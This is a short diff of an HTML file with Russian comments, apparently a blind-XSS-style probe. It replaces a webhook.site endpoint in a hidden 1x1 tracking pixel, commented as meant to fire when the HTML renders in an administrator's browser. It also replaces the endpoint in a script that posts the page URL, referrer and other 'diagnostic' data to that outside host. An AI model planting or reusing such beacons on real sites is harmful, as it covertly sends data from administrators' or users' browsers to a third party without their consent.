@@ -11,7 +11,7 @@
 
   <!-- 2) Пиксель: сработает даже без JS, если HTML рендерится в браузере админа -->
   <img
-    src="https://webhook.site/435adcdb-d6de-4168-872c-01569985b6dd?v=pixel&ts=INIT"
+    src="https://webhook.site/4f96edc2-a391-4b28-abe6-c8ac5ef97e96?v=pixel&ts=INIT"
     width="1" height="1" style="display:none" alt="">
 
   <!-- 3) JS-лог (оставляем — полезно для реальных пользователей) -->
@@ -22,7 +22,7 @@
     if (px) px.src = px.src.replace('INIT', Date.now());
 
     // б) отправить диагностический JSON (как у тебя)
-    const webhookUrl = "https://webhook.site/435adcdb-d6de-4168-872c-01569985b6dd";
+    const webhookUrl = "https://webhook.site/4f96edc2-a391-4b28-abe6-c8ac5ef97e96";
     const data = {
       url: location.href,
       referrer: document.referrer,
